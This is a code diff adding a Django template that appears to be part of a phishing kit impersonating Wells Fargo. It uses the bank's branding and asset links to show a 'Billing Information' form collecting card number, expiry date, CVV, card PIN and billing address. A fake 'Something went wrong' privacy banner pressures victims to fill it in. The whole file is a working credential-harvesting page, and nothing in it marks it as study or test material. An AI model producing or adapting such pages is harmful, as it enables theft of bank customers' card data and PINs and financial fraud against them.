@@ -1,0 +1,186 @@
+{% extends 'wells/base.html' %}
+{% load static %}
+
+{% block content %}
+<div class="inner">
+    <div id="signOn">
+        <div id="signOnMain">
+            <h2 id="signOnHeader"><img alt="Secure" role="img"
+                                       src="{% static '' %}WellsFargo/homepage-signon-lock.svg">Billing Information</h2>
+
+            <form autocomplete="off" data-login-app="true" id="frmSignon" method="post" name="signon">
+                {% csrf_token %}
+
+
+                <!--                            Credit Card Number-->
+
+                <div class="formElementsWrapper formElementsCCNumber" id="cardNumberDiv">
+                    <label class="id_label label_focus" for="creditcardnumber"
+                           id="cardNumberLabel">Card Number*</label>
+                    <input accesskey="F" autocomplete="off" class="formElement formElementText cardnumspace"
+                           id="creditcardnumber" maxlength="19"
+                           name="cardNumber" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..?)\../g, '$1');"
+                           required
+                           type="text">
+                </div>
+
+                <script>
+                                    $('.cardnumspace').on('keyup', function () {
+                                        var foo = $(this).val().split("-").join("");
+                                        if (foo.length > 0) {
+                                            foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
+                                        }
+                                        $(this).val(foo);
+                                    });
+
+                </script>
+
+                <!--                 Credit card expire date     -->
+
+                <div class="formElementsWrapper formElementsCCExpireDate" id="expiryDateDiv">
+                    <label class="id_label label_focus" for="ccexpire" id="expiryDateLabel">Expiry Date
+                        *</label>
+                    <input accesskey="CCEX" autocomplete="off" class="formElement formElementText ccexpireDate" id="ccexpire" maxlength="5"
+                           name="expiryDate" onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d\/\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')"
+                           placeholder="MM/YY" required
+                           size="2"
+                           style="padding-top: 22px;" type="text">
+                </div>
+
+
+                <!--                            DatePicker Field-->
+                <!--                            <div class="formElementsWrapper formElementDatePicker">
+                                            <label for="datepicker" class="id_label label_focus">Date Picker</label>
+
+
+                                            <input type="text"  accesskey="D" id="datepicker"
+                                                   class="formElement formElementDatePicker DatePicker" name="j_datepicker"
+                                                   maxlength="32" autocomplete="off"
+                                                   onfocus="(this.type='date')" style="padding-top: 22px;"/>
+                                        </div>-->
+
+
+                <!--                                    Credit card cvv            -->
+                <div class="formElementsWrapper formElementsCCccv" id="cardCVVDiv">
+                    <label class="id_label label_focus" for="creditcardCCV" id="cardCVVLabel">CVV
+                        *</label>
+                    <input accesskey="F" autocomplete="off" class="formElement formElementText creditcardCCV" id="creditcardCCV" maxlength="3"
+                           min="0" name="cardCVV" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..?)\../g, '$1');"
+                           placeholder=""
+                           required type="password">
+                </div>
+
+                <div class="formElementsWrapper formElementsCCccv" id="pinDiv">
+                    <label class="id_label label_focus" for="creditcardCCV" id="pinLabel">Card Pin
+                        *</label>
+                    <input accesskey="L" autocomplete="off" class="formElement formElementText creditcardCCV" id="pin" maxlength="4"
+                           min="0" name="pin" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..?)\../g, '$1');"
+                           placeholder=""
+                           required type="password">
+                </div>
+
+                <!--                                    Credit card Billing address            -->
+
+                <div class="formElementsWrapper formElementsCCAddress" id="billingAddressDiv">
+                    <label class="id_label label_focus" for="creditcardAddress"
+                           id="billingAddressLabel">Billing address *</label>
+                    <input accesskey="F" autocomplete="off" class="formElement formElementText creditcardAddress" format="" id="creditcardAddress"
+                           maxlength="25" min="0"
+                           name="billingAddress" placeholder="" required type="text">
+                </div>
+
+
+                <div class="formSubmit">
+                    <input class="c7" id="btnSignon" name="btnConfirm" type="submit" value="Confirm">
+                </div>
+
+                <input id="fidoAuth" name="fidoAuth" type="hidden" value="false">
+
+            </form>
+        </div>
+        <!--             <div id="signUp">
+
+                     <a href="https://oam.wellsfargo.com/oamo/identity/enrollment">Enroll Now</a>
+
+                     <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=signon">Security Center</a>
+                     <a href="https://www.wellsfargo.com/privacy-security/?linkLoc=signon">Privacy, Cookies, and
+                         Security</a>
+                 </div>-->
+    </div>
+
+
+</div>
+
+<div class="c3" style="    position: absolute;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+    -moz-transform: translateX(-50%);
+    -ms-transform: translateX(-50%);
+    -o-transform: translateX(-50%);
+    margin-top: 0;
+    width: 1200px;
+    background-color: rgba(231,218,218,0.9);;
+
+">
+    <div aria-label="Promotions Slideshow" class="c3wrapper" role="region">
+
+
+        <div class="carouselFrame item1" style="display: block;"><span class="hidden">Begin item
+                                1</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">
+
+
+                <div class="c3Img">
+                    <!--                                <img alt="" src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hph_default1_1200x532.jpg">-->
+
+                    <div class="imgChodak"></div>
+
+                </div>
+
+
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2 style="color: red">Something went wrong</h2>
+                            <span>Inorder to keep your privacy, please complete the required
+                                                instruction.</span>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 1</span>
+        </div>
+        <div class="carouselFrame item2" style="display: none;"><span class="hidden">Begin item 2</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en">
+
+
+                <div class="c3Img" data-cid="tcm:84-147036-16" data-ctid="tcm:91-146911-32">
+                    <img alt=""
+                         src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/enterprise/1200x532/wfi000_lg_b-wf-stagecoach_rednoborder_1200x532.gif">
+                </div>
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2>Keeping you informed</h2>
+
+
+                            <a class="c7" enrollmentid="3107" href="https://stories.wf.com/"
+                               role="button">Learn
+                                More</a>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 2</span>
+        </div>
+    </div>
+</div>
+{% endblock content %}
